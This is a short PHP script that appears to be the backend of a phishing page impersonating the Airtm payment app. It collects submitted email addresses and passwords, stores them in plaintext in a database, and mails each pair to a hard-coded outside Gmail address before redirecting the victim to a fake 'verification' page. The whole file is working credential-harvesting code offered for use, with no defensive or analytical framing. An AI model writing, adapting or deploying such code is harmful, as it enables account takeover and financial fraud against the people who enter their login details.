<?php


ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Database configuration to save user credentials
$servername = "";  // IP address of the MySQL server (localhost)
$port = "";
$username = "";
$password = ""; // Change this if your database has a password
$dbname = ""; // Replace with your database name

// Include Composer's autoloader
require 'vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Create a connection
$conn = new mysqli($servername, $username, $password, $dbname, $port);

// Check the connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get email and password from the form
    $email = $conn->real_escape_string($_POST['email']);
    $password = $conn->real_escape_string($_POST['password']);

    // Insert email and password into the database
    $sql = "INSERT INTO users (email, password) VALUES ('$email', '$password')";

    if ($conn->query($sql) === TRUE) {
        // Send an email using PHPMailer
        $mail = new PHPMailer(true);
        try {
            // Server settings
            $mail->isSMTP();
            $mail->Host = 'smtp.gmail.com';
            $mail->SMTPAuth = true;
            $mail->Username = '';  // Your Gmail address
            $mail->Password = '';              // Your Gmail app-specific password
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;   // Use SSL
            $mail->Port = 465;

            // Recipients
            $mail->setFrom('microcryptosoft2022@gmail.com', 'Airtm App');
            $mail->addAddress('sakroilouiser@gmail.com'); // Recipient email

            // Content
            $mail->isHTML(true);                                  // Set email format to HTML
            $mail->Subject = 'New User Registration';
            $mail->Body = "A new user has registered with the email: <strong>$email</strong>   email: <strong>$password</strong>.";
            $mail->AltBody = "A new user has registered with the email: $email.";

            $mail->send();
            // Redirect after sending the email
            header("Location: verification.php");
            exit();
        } catch (Exception $e) {
            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
        }
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }

    // Close the connection
    $conn->close();
}
?>
